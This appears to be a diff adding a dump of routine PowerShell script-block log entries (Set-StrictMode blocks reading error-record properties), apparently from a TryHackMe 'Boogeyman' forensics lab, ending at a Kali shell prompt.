+[2023-01-13 17:34:06.549572Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:39.901057Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:39.899966Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:39.898778Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:39.894104Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:39.215201Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:39.214038Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:39.212792Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:39.208119Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:38.318960Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:38.317914Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:38.316688Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:38.311851Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:37.442744Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:37.441677Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:37.440504Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:37.434795Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:37.068997Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:37.067946Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:37.066792Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:37.062024Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:36.160895Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:36.159831Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:36.158579Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:36.153699Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:35.785871Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:35.784817Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:35.783658Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:35.778757Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:34.895242Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:34.894208Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:34.893049Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:34.888094Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:34.540372Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:34.539236Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:34.537865Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:34.530274Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:33.626625Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:33.625509Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:33.624330Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:33.584508Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:33.226253Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:33.225117Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:33.223780Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:33.217785Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:32.344710Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:32.343576Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:32.342420Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:32.337930Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:31.988925Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:31.987920Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:31.986753Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:31.981903Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:31.117996Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:31.116914Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:31.115724Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:31.110210Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:30.746027Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:30.745029Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:30.743891Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:30.739466Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:29.875993Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:29.874937Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:29.873703Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:29.842773Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:29.490682Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:29.489614Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:29.488244Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:29.480982Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:28.583982Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:28.582859Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:28.581516Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:28.575765Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:28.246954Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:28.245886Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:28.244747Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:28.240231Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:27.377454Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:27.376333Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:27.375199Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:27.370700Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:27.016315Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:27.015314Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:27.014160Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:27.009748Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:26.143073Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:26.141491Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:26.140297Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:26.135425Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:25.774329Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:25.773303Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:25.772089Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:25.765610Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:24.847736Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:24.846618Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:24.844608Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:24.839876Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+[2023-01-13 17:34:24.468034Z] { Set-StrictMode -Version 1; $_.OriginInfo }
+---
+[2023-01-13 17:34:24.467003Z] { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+---
+[2023-01-13 17:34:24.465761Z] { Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }
+---
+[2023-01-13 17:34:24.460908Z] { Set-StrictMode -Version 1; $_.PSMessageDetails }
+---
+                                                                                                                                                     
+┌──(poopi㉿kali)-[~/thm/boogeyman1]
+└─$ a                                        
